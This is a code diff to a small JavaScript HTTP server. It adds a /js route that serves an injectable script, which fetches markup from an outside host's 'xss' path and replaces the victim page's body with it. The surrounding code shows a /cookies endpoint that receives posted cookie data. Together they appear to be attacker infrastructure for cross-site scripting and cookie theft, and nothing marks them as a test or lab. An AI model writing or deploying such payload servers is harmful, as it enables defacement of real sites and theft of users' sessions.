@@ -22,6 +22,16 @@ serve({
       });
     }
 
+    if (url.pathname === "/js" && req.method === "GET") {
+      const jsCode = "fetch('data.estebanmf.space/xss').then(t=>t.text()).then(d=>document.body.innerHTML=d)";
+      return new Response(jsCode, {
+        headers: {
+          "Content-Type": "application/javascript",
+          "Access-Control-Allow-Origin": origin,
+        },
+      });
+    }
+
     // POST /cookies
     if (url.pathname === "/cookies" && req.method === "POST") {
       const body = (await req.json().catch(() => null)) as { cookies?: string } | null;
